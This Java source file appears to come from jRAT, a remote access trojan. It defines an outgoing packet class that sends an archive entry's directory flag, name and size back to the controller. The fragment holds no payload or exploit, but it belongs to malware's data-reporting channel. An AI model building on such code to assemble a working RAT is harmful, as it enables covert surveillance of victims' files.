package jrat.client.packets.outgoing;

import jrat.client.Connection;


public class Packet45ArchivePreview extends AbstractOutgoingPacket {

	private boolean directory;
	private String name;
	private long size;

	public Packet45ArchivePreview(boolean directory, String name, long size) {
		this.directory = directory;
		this.name = name;
		this.size = size;
	}

	@Override
	public void write(Connection con) throws Exception {
        con.writeBoolean(directory);
        con.writeLine(name);
        con.writeLong(size);
	}

	@Override
	public short getPacketId() {
		return 45;
	}

}
